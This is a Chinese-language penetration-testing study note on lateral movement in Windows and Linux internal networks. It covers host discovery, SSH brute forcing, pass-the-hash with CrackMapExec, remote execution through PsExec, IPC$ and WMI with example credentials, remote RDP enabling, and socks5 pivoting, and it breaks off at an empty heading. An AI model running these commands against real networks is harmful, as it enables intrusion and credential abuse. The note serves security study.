零 思路
（一）概念：横移就是在内网环境中从一台主机跳到另一台。



（二）横移的步骤：
0 信息搜集：
（1）探测网内主机：
a Linux主机上：
arp-scan --localhost
nmap -sn 192.168.43.0/24
for /L %i in (1,1,254) do ping -n 1 192.168.1.%i，然后arp -a。
b Windows主机上：
也能用nmap。
for /L %i in (1,1,254) do ping -n 1 192.168.1.%i，然后arp -a。


1 根本点：密码。跳的方法好说，有很多方法，但是关键在于能拿到密码或者ticket之类的票据。

2 横移利用。



（三）最基本的横移方法就是ssh爆破，这在内网中是相当可行的，因为内网中充斥了各种弱口令，尤其是对Linux主机，ssh更有效，因为Windows也许会禁用ssh，但Linux不可能。



（四）通过NAS进行横移是核心方法
1 拿域控
（1）域的概念
通俗理解：内网中的主机主要以域环境（域名，中学）为主而非工作组（WORKGROUP，大学）这种离散环境。
精确概念：域 == Windows域 ≈ Active Directory（AD）：域是Windows的网络结构，AD是网络管理工具和配置信息数据库负责管理域和存储配置信息 ≈ Domain Controller（DC）：是AD所处的服务器 ≈ SMB协议 + Kerberos协议：这两个协议是构建域的核心协议，关于这两个协议的原理请看《计算机网络》，SMB协议的操作请看Windows命令
（2）通过以上对域概念的理解，可见：拿下DC等拿下域，因而DC是横移的首要目标。

2 SMB等共享协议（NAS协议）提供了很多切入点。



（五）拿到密码后的横移利用：
1 一般情况下，一个企业的某个局域网环境中的主机会由管理员使用同一镜像安装，这让横移利用变得简单，甚至存在相同的默认管理员密码。

2 很多用户有使用相同密码的习惯，尤其是在内网环境中，某些有安全意识的用户也许也会放下戒备使用相同密码。







一 Windows横移的一些工具
（零）利用经典漏洞：
1 MS08-067

2 MS17-010：EhernalBlue

（一）CrackMapExec
1 CrackMapExec 可以对 C 段中的主机进行批量 pth。

2 项目地址：https://github.com/byt3bl33d3r/CrackMapExec.git

3 使用命令：crackmapexec smb <ip-c, such as 192.168.43.0/24> -u <username, such as administrator> -H <passwd-hash>



（二）minikatz：https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20220919
没搞明白怎么用，一键入命令就是报错。



（三）psexec
0 原理：通过管道（需要IPC$和ADMIN$，因而其本质就是SMB协议）在远程目标主机上创建一个psexec 服务，并在本地磁盘中生成一个名为 PSEXESVC 的二进制文件，然后通过psexec 服务运行命令，运行结束后删除服务。
本质上就是：
（1）建立ipc：net use \\目标主机\IPC$ /user:用户名 密码
（2）与ipc有关的操作是（其实这两个操作不就是我们渗透测试的初级目标吗？一台机器能上传能执行就等于这台机器被初步攻克了）：上传、执行：
a 上传：copy 本地文件路径 \\目标主机\共享文件夹路径
下载：copy \\目标主机\共享文件夹路径\文件名 本地文件路径
b 执行（通过创建并启用一个系统服务来执行exe）：sc create <新服务名> binPath= "<可执行文件路径>" start= <启动类型>

1 使用方法：PsExec[64].exe /accepteula [/s] \\<dst-ip> -u <dst-username> -p <passwd> cmd
（1）-accepteula 第一次运行 PsExec 会弹出确认框，使用该参数就不会弹出确认框
（2）-s 以 System 权限运行远程进程，如果不用这个参数，就会获得一个对应用户权限的 shell 直接执行回显
（3）-u 域\用户名
（4）-p 密码

2 溯源：由于创建或删除服务时会产生大量的日志，因此蓝队在溯源时可以通过日志反推攻击流程。



（四）WMI
0 概念介绍
（1）全称 Windows Management Instrumentation，即 Windows 管理工具。
（2）Windows 98 以后的操作系统都支持 WMI。
（3）由于 Windows 默认不会将 WMI 的操作记录在日志里，同时现在越来越多的杀软将PsExec 加入了黑名单，因此 WMI 比 PsExec 隐蔽性要更好一些。
（4）使用 WMIC 连接远程主机，需要目标主机开放 135 和 445 端口（135 端⼝是 WMIC 默认的管理端⼝，wimcexec 使⽤445 端⼝传回显）。

1 wmic命令
例子：WMI 连接192.168.43.219，并使用目标系统的 cmd.exe 执行命令，将执行结果保存在目标主机 C 盘share目录的 ip.txt 文件中。
wmic /node:192.168.43.219 /user:administrator /password:root process call create "cmd.exe /c ipconfig > c:\share\ip.txt"

2 wmiexec.vbs
（1）下载地址：https://github.com/k8gege/K8tools/blob/master/wmiexec.vbs
（2）使用 vmiexec.vbs 执行单条命令
cscript wmiexec.vbs /cmd 192.168.0.123 administrator 123456 "ipconfig"
cscript //nologo wmiexec.vbs /shell 192.168.0.123 administrator 123456

3 其他命令
（1）判断RDP是否开启
方法一（cmd）：telnet <hostname> 3389
如果出现一个空白cmd窗口，说明开了；
如果Connecting To <hostname>...Could not open connection to the host, on port 3389: Connect failed，说明没开。
方法二（powershell）：Test-NetConnection -ComputerName <hostname> -Port 3389
如果出现类似于下面这种说明开了：
ComputerName     : 192.168.43.219
RemoteAddress    : 192.168.43.219
RemotePort       : 3389
InterfaceAlias   : WLAN
SourceAddress    : 192.168.43.223
TcpTestSucceeded : True
如果出现下面说明没开：
TcpTestSucceeded  : False
（2）打开RDP
wmic /node:192.168.43.219 /user:administrator /password:root RDTOGGLE WHERE ServerName='TAREGT-WIN7' call SetAllowTSConnections 1
测试结果：此级别的开关异常。







二 跳板（pivot）
（零）什么是跳板？
域一般是一个局域网，你可以从一台主机调到另一台，但是一个单元网（很多单元网就是内网，一般是nat网络，只能出不能进）内会有内网（内网说白了就是访问受限的局域网，只能出不能进或者不能进也不能出），但是在内网中的有些主机（比如nat网关）可能具有多网卡（注意：双网卡但不提供路由，提供路由那不是内网了），这种连接不同内网的主机就叫跳板机（pivot机），那么什么是跳板呢？我们可以在跳板机上设置一个socks5代理，让内网中的主机通过socks5回连，代理就是跳板了。



（一）
